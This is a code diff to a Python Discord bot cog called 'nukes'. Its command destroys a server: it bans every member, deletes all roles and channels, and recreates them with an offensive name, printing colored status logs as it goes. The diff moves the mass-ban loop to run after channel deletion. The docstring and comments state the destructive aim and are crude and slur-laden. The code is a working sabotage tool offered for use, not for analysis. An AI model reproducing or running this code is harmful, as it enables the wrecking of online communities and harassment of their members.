@@ -131,20 +131,6 @@ class nukes(commands.Cog):
     async def execute(self, ctx):
         """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
         await ctx.message.delete()
-        print(
-            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
-        )
-        for member in ctx.guild.members:
-            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
-            try:
-                await member.ban()
-                print(
-                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
-                )
-            except:
-                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")
-
-        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")
 
         print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Started role DELETION")
         roles = ctx.guild.roles
@@ -180,6 +166,22 @@ class nukes(commands.Cog):
                 print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
             except:
                 print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Failed to delete {channel}")
+
+                print(
+            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
+        )
+        
+        for member in ctx.guild.members:
+            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
+            try:
+                await member.ban()
+                print(
+                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
+                )
+            except:
+                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")
+
+        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
         # delete all channels so we can flood that shit lmfao
 
         for i in range(1, 25):
